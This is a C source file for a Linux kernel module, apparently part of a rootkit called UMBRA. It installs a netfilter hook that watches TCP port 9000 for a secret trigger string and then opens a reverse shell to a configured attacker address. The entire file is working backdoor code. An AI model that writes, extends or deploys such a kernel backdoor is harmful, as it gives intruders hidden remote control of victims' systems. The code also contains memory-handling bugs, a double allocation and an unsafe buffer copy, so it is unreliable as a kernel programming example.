#include "../include/netfilter_manager.h"
#include "../include/utils.h"
#include "../include/CONFIG.h"

const char* UMBRA_BACKDOOR_KEY = "UMBRA_PAYLOAD_GET_REVERSE_SHELL";
/**
 * Inspects incoming packets and check correspondence to backdoor packet:
 *      Proto: TCP
 *      Port: 9000
 *      
 */ 
unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state){
    //Network headers
    struct iphdr *ip_header;        //ip header
    struct tcphdr *tcp_header;      //tcp header
    struct sk_buff *sock_buff = skb;//sock buffer
    char *user_data;       //data header pointer
    unsigned char *tail;            //data tail pointer
    int size;                       //payload size
    char* _data;

    struct tcphdr _tcphdr;
    struct iphdr _iph;

    if (!sock_buff){
        return NF_ACCEPT; //socket buffer empty
    }
    
    ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
    //ip_header = (struct iphdr *)skb_network_header(sock_buff);
    if (!ip_header){
        return NF_ACCEPT;
    }

    //Backdoor trigger: TCP
    if(ip_header->protocol==IPPROTO_TCP){ 
        unsigned int dport;

        tcp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_tcphdr), &_tcphdr);
        //tcp_header= (struct tcphdr*)((unsigned int*)ip_header+ ip_header->ihl);

        dport = htons((unsigned short int) tcp_header->dest);
        //printk(KERN_INFO "UMBRA:: Received packet on port %u\n", dport);
        if(dport != 9000){
            return NF_ACCEPT; //We ignore those not for port 9000
        }
        printk(KERN_INFO "UMBRA:: Received packet on port 9000\n");
        
        /* Calculate pointers for begin and end of TCP packet data */
        //user_data = (unsigned char*)((unsigned char *)ip_header+ ip_header->ihl*4 + tcp_header->doff*4);
        tail = skb_tail_pointer(skb);

        

        //size = htons(ip_header->tot_len) - ip_header->ihl*4 - tcp_header->doff*4;
        size = htons(ip_header->tot_len) - sizeof(_iph) - tcp_header->doff*4;
        _data = kmalloc(size, GFP_KERNEL);

			if (!_data)
				return NF_ACCEPT;
        _data = kmalloc(size, GFP_KERNEL);
        user_data = skb_header_pointer(skb, ip_header->ihl*4 + tcp_header->doff*4, size, &_data);
        if(!user_data){
            printk(KERN_INFO "NULL INFO");
            kfree(_data);
            return NF_ACCEPT;
        }
        //user_data = (unsigned char *)((unsigned char *)tcp_header + (tcp_header->doff * 4));
        printk(KERN_INFO "IP offest %i\n", ip_header->ihl*4);
        printk(KERN_INFO "tcp offest %i\n", tcp_header->doff*4);
       
        printk(KERN_INFO "Total length %i\n", htons(ip_header->tot_len));
        printk(KERN_INFO "Size of payload %i\n", size);
        

        printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
        printk(KERN_DEBUG "%s\n", user_data);

        if(strlen(user_data)<32){
            return NF_ACCEPT;
        }

        if(memcmp(user_data, UMBRA_BACKDOOR_KEY, strlen(UMBRA_BACKDOOR_KEY))==0){
            //Packet had the secret payload.
            printk(KERN_INFO "UMBRA:: Received backdoor packet \n");
            //kfree(_data);
            start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
            return NF_DROP;
        }


        return NF_ACCEPT;

    }
    return NF_ACCEPT;

}

/**
 * The struct comes from netfilter
 */ 
/*static struct nf_hook_ops nf_hook_struct = {
    .hook	  = (nf_hookfn*)net_hook,
    //.owner	  = THIS_MODULE,
    .pf		  = PF_BRIDGE,
    .hooknum  = NF_INET_PRE_ROUTING, //Right after ip_rcv
    .priority = NF_IP_PRI_FIRST
};*/

static struct nf_hook_ops nfho;

/**
 * Registers predefined nf_hook_ops
 */ 
int register_netfilter_hook(void){
    int err;
    
    nfho.hook = net_hook;
    nfho.pf = PF_INET;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.priority = NF_IP_PRI_FIRST;

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        err = nf_register_net_hook(&init_net, &nfho);
    #else
        err = nf_register_hook(&nfho);
    #endif
    if(err<0){
        printk(KERN_INFO "UMBRA:: Error registering nf hook");
    }else{
        printk(KERN_INFO "UMBRA:: Registered nethook");
    }
    
    return err;
}

/**
 * Unregisters predefined nf_hook_ops
 */ 
void unregister_netfilter_hook(void){
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        nf_unregister_net_hook(&init_net, &nfho);
    #else
        nf_unregister_hook(&nfho);
    #endif
    printk(KERN_INFO "UMBRA:: Unregistered nethook");

}